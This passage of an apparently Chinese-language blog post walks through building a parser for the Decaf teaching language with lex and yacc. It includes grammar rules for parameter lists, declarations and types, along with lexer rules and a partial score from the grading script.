class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述语法分析器可以完美完成第一个样例，大体包含了对以下部分的处理：</p>
<ul>
<li>类定义，函数定义，函数调用，函数声明，表达式，IF语句，语句块</li>
</ul>
<p>我这里说明几点需要注意的地方</p>
<p>函数参数列表的问题：我们不能提前确定传入函数的参数个数，因此需要利用循环（FOR 语句的处理也是同理）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">para_list_use: para_usen &#123; </span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    | &#123; <span class="comment">/* 没有参数 */</span></span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_usen: para_use T_COMMA para_usen &#123; <span class="comment">/* 剩余多个参数 */</span></span><br><span class="line">        decafStmtList * para = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | para_use &#123; <span class="comment">/* 剩余一个参数 */</span></span><br><span class="line">        decafStmtList * para = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure>
<ul>
<li>当处理 para_list_use 时，会有2种情况：<ul>
<li>无参数，不需要处理</li>
<li>有参数，进入 para_usen，对于每一个 para_usen 有2种情况：<ul>
<li>剩余多个参数：将 para_use 压栈，继续匹配 para_usen 循环处理</li>
<li>剩余一个参数：将 para_use 压栈</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>常量取值问题：对于常量需要再词法分析时将其字符串拷贝进来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;all_char&#125;                 &#123; yylval.sval = <span class="keyword">new</span> <span class="built_in">string</span>(yytext);<span class="keyword">return</span> T_CHARCONSTANT; &#125;</span><br><span class="line">&#123;all_str&#125;                  &#123; yylval.sval = <span class="keyword">new</span> <span class="built_in">string</span>(yytext);<span class="keyword">return</span> T_STRINGCONSTANT; &#125;</span><br><span class="line">&#123;decimal_num&#125;|&#123;hex_num&#125;    &#123; yylval.sval = <span class="keyword">new</span> <span class="built_in">string</span>(yytext);<span class="keyword">return</span> T_INTCONSTANT; &#125;</span><br></pre></td></tr></table></figure>
<p>注释处理问题：注释需要在词法分析时进行匹配（最好不要返回 token）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;//&quot;</span>[^\n]*  	             &#123; &#125;</span><br><span class="line"><span class="string">&quot;/*&quot;</span>([^\*]|(\*)*[^\*/])*(\*)*<span class="string">&quot;*/&quot;</span> &#123; &#125;       </span><br></pre></td></tr></table></figure>
<p>得分结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  decafast git:(master) ✗ python3 check.<span class="function">py  </span></span><br><span class="line"><span class="function"><span class="title">Correct</span><span class="params">(dev)</span>: 42 / 134</span></span><br><span class="line"><span class="function"><span class="title">Score</span><span class="params">(dev)</span>: 42.00</span></span><br><span class="line"><span class="function">Total Score: 42.00</span></span><br></pre></td></tr></table></figure>
<p>已经匹配了部分样例，剩下的就是完善加调整，最后写一个完整分析器：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">char</span> *)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// print AST?</span></span><br><span class="line"><span class="keyword">bool</span> printAST = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafast.cc&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%define parse.error verbose</span><br><span class="line"></span><br><span class="line">%<span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> *<span class="title">ast</span>;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> *sval;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">%token T_PACKAGE T_EXTERN T_FUNC T_SEMICOLON T_COMMA T_CONTINUE T_FALSE T_TRUE T_VAR T_FOR T_NULL T_RETURN T_WHITESPACE</span><br><span class="line">%token T_AND T_ASSIGN T_DIV T_DOT T_EQ T_RIGHTSHIFT T_GEQ T_GT T_LEFTSHIFT T_LEQ T_LT T_MINUS T_MOD T_MULT T_NEQ T_NOT T_OR T_PLUS</span><br><span class="line">%token T_VOID T_INTTYPE T_BOOLTYPE T_STRINGTYPE</span><br><span class="line">%token T_LCB T_RCB T_LPAREN T_RPAREN T_LSB T_RSB </span><br><span class="line">%token T_COMMENT</span><br><span class="line">%token T_BREAK T_ELSE T_IF T_WHILE</span><br><span class="line">%token &lt;sval&gt; T_ID T_INTCONSTANT T_CHARCONSTANT T_STRINGCONSTANT</span><br><span class="line"></span><br><span class="line">%type &lt;ast&gt; state_if state_while lvalues state_for state_break state_continue state_return <span class="built_in">exp</span> assign assigns assignss method_call lvalue statements statement extern_list para_list_use para_usen para_use para_list_def block blockt var_decls var_decl method_decls method_decl decafpackage var_declp var_declps extern_def extern_defn extern_typen extern_type func_typen func_type method_type type</span><br><span class="line"></span><br><span class="line">%right T_ASSIGN </span><br><span class="line">%left T_OR</span><br><span class="line">%left T_AND</span><br><span class="line">%left T_EQ T_NEQ T_LT T_GT T_GEQ T_LEQ</span><br><span class="line">%left T_PLUS T_MINUS </span><br><span class="line">%left T_MULT T_DIV T_MOD T_RIGHTSHIFT T_LEFTSHIFT</span><br><span class="line">%right T_NOT </span><br><span class="line">%right T_UMINUS</span><br><span class="line">%right T_LPAREN</span><br><span class="line">%left T_RPAREN</span><br><span class="line">%nonassoc T_IF</span><br><span class="line">%nonassoc T_ELSE</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">start: program</span><br><span class="line"></span><br><span class="line">program: extern_list decafpackage&#123; </span><br><span class="line">        ProgramAST *prog = <span class="keyword">new</span> ProgramAST((decafStmtList *)$<span class="number">1</span>, (PackageAST *)$<span class="number">2</span>); </span><br><span class="line">		<span class="keyword">if</span> (printAST) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; getString(prog) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">delete</span> prog;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_list: extern_defn &#123; </span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_defn: extern_def extern_defn &#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_def: T_EXTERN T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type T_SEMICOLON &#123;</span><br><span class="line">        decafEXFuncDef *func = <span class="keyword">new</span> decafEXFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">5</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">7</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">3</span>);</span><br><span class="line">        func-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        func-&gt;put_para((decafPara*)para);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">3</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_list_use: para_usen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_usen: para_use T_COMMA para_usen &#123;</span><br><span class="line">        decafStmtList * para = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | para_use &#123;</span><br><span class="line">        decafStmtList * para = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_use: method_call &#123; $$ = $<span class="number">1</span>;&#125;</span><br><span class="line">    | <span class="built_in">exp</span> &#123;$$ = $<span class="number">1</span>;&#125; </span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">para_list_def: extern_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | func_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_typen: func_type T_COMMA func_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;     </span><br><span class="line">    &#125;</span><br><span class="line">    | func_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;   </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_type: T_ID extern_type &#123;</span><br><span class="line">        decafType* type = (decafType*)$<span class="number">2</span>;</span><br><span class="line">        type-&gt;put_name(*$<span class="number">1</span>);</span><br><span class="line">        $$ = type;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_typen: extern_type T_COMMA extern_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | extern_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_type: T_STRINGTYPE &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;StringType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    | type &#123; decafType* type = (decafType* )$<span class="number">1</span>; $$ = type;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_type: T_VOID &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;VoidType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    | type &#123; decafType* type = (decafType* )$<span class="number">1</span>; $$ = type;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">type: T_INTTYPE &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;IntType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    | T_BOOLTYPE &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;BoolType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">decafpackage: T_PACKAGE T_ID T_LCB var_declps method_decls T_RCB &#123;</span><br><span class="line">        decafVarList *field = (decafVarList *)$<span class="number">4</span>;</span><br><span class="line">        decafStmtList *method = (decafStmtList *)$<span class="number">5</span>;</span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, field, method); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | T_PACKAGE T_ID T_LCB T_RCB &#123; </span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, <span class="keyword">new</span> decafVarList(), <span class="keyword">new</span> decafStmtList()); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_declps: var_declp var_declps &#123;</span><br><span class="line">        decafVarList *slist = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;cat_front((decafVarList *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafVarList *slist = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_declp: T_VAR lvalues type T_SEMICOLON &#123;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_types(type-&gt;get_type());</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_kinds(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_ASSIGN <span class="built_in">exp</span> T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>;</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        var-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        var-&gt;put_exp(<span class="built_in">exp</span>);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        var-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decls: var_decl var_decls &#123;</span><br><span class="line">        decafVarList *slist = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;cat_front((decafVarList *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafVarList *slist = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decl: T_VAR lvalue type T_ASSIGN <span class="built_in">exp</span> T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>;</span><br><span class="line">        var-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        var-&gt;put_exp(<span class="built_in">exp</span>);</span><br><span class="line">        <span 